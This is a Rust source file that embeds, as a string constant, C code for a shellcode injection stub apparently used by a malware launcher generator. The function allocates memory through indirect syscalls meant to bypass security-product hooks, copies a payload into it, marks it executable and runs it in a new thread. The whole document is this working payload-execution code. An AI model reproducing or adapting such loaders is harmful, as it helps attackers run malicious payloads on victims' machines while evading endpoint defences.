pub const LOCALCOMMONINJ_C: &str = r#"

#include "../include/LocalCommonInj.h"
#include <stdio.h>
#include <windows.h>
LAUNCHER_STATUS LocalCommonInj(IN PVOID pBuffer, IN DWORD sBufferSize, IN PNTAPI_FUNC g_Nt)
{

        if (pBuffer == NULL || sBufferSize == 0 || g_Nt == NULL)
        {
                printf("[!] Invalid Parameter\n");
                return LAUNCHER_STATUS_INVALID_PARAMETER;
        }

        NTSTATUS STATUS = 0;
        DWORD dwOld = 0;
        HANDLE hThread = NULL, hProcess = (HANDLE)-1;
        PVOID pAddress = NULL;
        SIZE_T ssBufferSize = sBufferSize;

        SET_SYSCALL(g_Nt->NtAllocateVirtualMemory);
        if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) !=
                0x00 ||
            pAddress == NULL)
        {
                printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
                return LAUNCHER_STATUS_FAILED;
        }

        // copying the payload
        printf("[+] Allocated Memory At Address 0x%p \n", pAddress);
        memcpy(pAddress, pBuffer, ssBufferSize);
        printf("[i] Buffer Size: %d\n", ssBufferSize);

        printf("[i] Calling NtProtectVirtualMemory ... ");
        // changing memory protection
        SET_SYSCALL(g_Nt->NtProtectVirtualMemory);
        if ((STATUS = RunSyscall(hProcess, &pAddress, &ssBufferSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00)
        {
                printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
                return LAUNCHER_STATUS_FAILED;
        }
        printf("[+] DONE \n");

        printf("[i] Calling NtCreateThreadEx ... ");
        // executing the payload
        SET_SYSCALL(g_Nt->NtCreateThreadEx);
        if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL,
                                 NULL)) != 0x00)
        {
                printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
                return LAUNCHER_STATUS_FAILED;
        }
        printf("[+] DONE \n");
        printf("[+] Thread %d Created Of Entry: 0x%p \n", GetThreadId(hThread), pAddress);

        printf("[i] Calling NtWaitForSingleObject ... ");
        // waiting for the payload
        SET_SYSCALL(g_Nt->NtWaitForSingleObject);
        if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00)
        {
                printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
                return LAUNCHER_STATUS_FAILED;
        }
        printf("[+] DONE \n");
        return LAUNCHER_STATUS_SUCCESS;
}
"#;
